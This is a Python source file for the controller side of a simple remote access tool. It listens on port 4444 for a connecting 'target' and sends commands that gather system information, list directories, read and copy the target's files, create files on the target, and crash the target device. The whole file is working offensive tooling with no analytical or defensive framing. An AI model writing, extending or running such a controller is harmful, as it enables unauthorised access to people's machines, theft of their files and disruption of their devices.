import socket
try:
    s = socket.socket()
    port = 4444

    s.bind(('', port))
    print("Server is listening ...")
    print("Port [", port, "] is open")
    s.listen(1)
    conn, addr = s.accept()
    print(addr[0], "Has connected successfully")
    message = "You connected to the server ...! "
    conn.send(message.encode())

    while 1:
        command = input(str("Enter your command :- "))

        if command == "help":
            print("")
            print('sysinfo        "Information about targets device"')
            print('pwd            "Get path of your file"')
            print('create         "Create a file in targets device"')
            print('ls             "Show all files and folders in specific path"')
            print('read           "Read a file in specific path"')
            print('crash          "Crash targets device"')
            print("")

        elif command == "sysinfo":
            conn.send(command.encode())
            os = conn.recv(1024).decode()
            print(os)

        elif command == "pwd":
            conn.send(command.encode())
            pwd = conn.recv(5000).decode()
            print("File path in target device ===>", pwd)

        elif command == "create":
            conn.send(command.encode())
            print("Enter the path that you want create a file \n like xxxx/xxxx/xxxx/xxx/xxxx/your_file_name.xxx")
            path_cr = input("======> ")
            conn.send(path_cr.encode())
            text = input("Enter the text that you want be in the file\n===> ")
            conn.send(text.encode())
            recv_cr = conn.recv(1024).decode("utf-8")
            if recv_cr == "error":
                print("Error .....!")
            else:
                print("Message sent")

        elif command == "ls":
            conn.send(command.encode())
            ls = input("Enter the path that you want to see it ===> ")
            conn.send(ls.encode())
            recv_ls = conn.recv(50000).decode("utf-8")
            if recv_ls == "error":
                print("Path not found....!")
            else:
                print(recv_ls)

        elif command == "read":
            conn.send(command.encode())
            path_re = input("Enter the path of the file that you want to read =====> ")
            conn.send(path_re.encode())
            text = conn.recv(50000).decode("utf-8")
            if text == "error":
                print("File not found....!")
            else:
                print("The text in the file ===>\n\n", text, "\n\n\n")
                save = input("  Do you want save all text in File_text.txt ? y/n :- ")
                if save == "y":
                    with open("File_text.txt", "w+") as re_text:
                        re_text.write(text)
                elif save == "n":
                    print("OK")

        elif command == "crash":
            conn.send(command.encode())

        elif command == "":
            print("")

        else:
            print("command not found ..!")

except:
    print("Client has been Disconnected ....!")
